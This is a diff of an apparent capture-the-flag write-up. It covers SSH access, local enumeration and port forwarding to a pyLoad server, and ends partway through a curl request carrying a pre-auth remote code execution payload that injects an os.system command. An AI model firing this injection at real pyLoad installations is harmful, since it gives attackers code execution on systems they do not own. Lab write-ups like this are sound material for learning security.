@@ -39,10 +39,11 @@ Now we have a username and password that we can try if they work for ssh.
 Indeed they do as I ssh in as sau. There was user.txt in /home/sau.
 Uploaded 'lse.sh' from my pc to the target machine to help enumerate.
 There were 'Services listening only on localhost' so I used 'netstat -ant' to find out what they are.
-For some reason, there was a localhost listening on port 8080.
+'ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214' to forward port to my machine.
+'pyLoad' server is found on the port 
+I tried the default username and password but didn't get in.
 
-ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214
-pyLoad
+There is a pre-auth RCE exploit available.
 
 curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
